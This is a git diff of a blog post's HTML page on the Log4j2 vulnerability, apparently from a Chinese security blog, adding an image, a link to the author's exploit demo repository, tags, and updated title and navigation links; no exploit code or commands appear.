+<img src="/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708112758092.png" srcset="/img/loading.gif" lazyload class="" title="image-20240708112758092">
 
 
 
@@ -563,6 +565,7 @@ mjx-container[display="true"] + br {
 </li>
 <li>禁止没有必要的业务访问外网</li>
 </ol>
+<p><a target="_blank" rel="noopener" href="https://github.com/3xsh0re/Log4j2Exploiter">附上我的利用工具Demo</a></p>
 
                 
               </div>
@@ -571,6 +574,36 @@ mjx-container[display="true"] + br {
             <div>
               <div class="post-metas my-3">
   
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="category-chain-item">漏洞分析</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="print-no-link">#漏洞分析</a>
+      
+        <a href="/tags/Java%E5%AE%89%E5%85%A8/" class="print-no-link">#Java安全</a>
+      
+    </div>
   
 </div>
 
@@ -580,8 +613,8 @@ mjx-container[display="true"] + br {
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Log4j2反序列化漏洞原理分析</div>
-      <div>https://3xsh0re.github.io/2024/06/10/Log4j2反序列化漏洞原理分析/</div>
+      <div>Log4j2解析漏洞原理分析</div>
+      <div>https://3xsh0re.github.io/2024/06/10/Log4j2解析漏洞原理分析/</div>
     </div>
     <div class="license-meta">
       
@@ -625,9 +658,9 @@ mjx-container[display="true"] + br {
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/06/14/leetcode236%E5%A4%8D%E4%B9%A0%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E7%A5%96%E5%85%88%E8%8A%82%E7%82%B9/" title="leetcode236复习二叉树的祖先节点">
+                      <a href="/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/" title="Log4j2反序列化漏洞原理分析">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">leetcode236复习二叉树的祖先节点</span>
+                        <span class="hidden-mobile">Log4j2反序列化漏洞原理分析</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -635,8 +668,8 @@ mjx-container[display="true"] + br {
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/" title="Log4j2解析漏洞原理分析">
-                        <span class="hidden-mobile">Log4j2解析漏洞原理分析</span>
+                      <a href="/2024/06/06/leetcode114%E8%AE%A4%E8%AF%86%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%89%8D%E9%A9%B1%E8%8A%82%E7%82%B9/" title="leetcode114认识二叉树的前驱节点">
+                        <span class="hidden-mobile">leetcode114认识二叉树的前驱节点</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
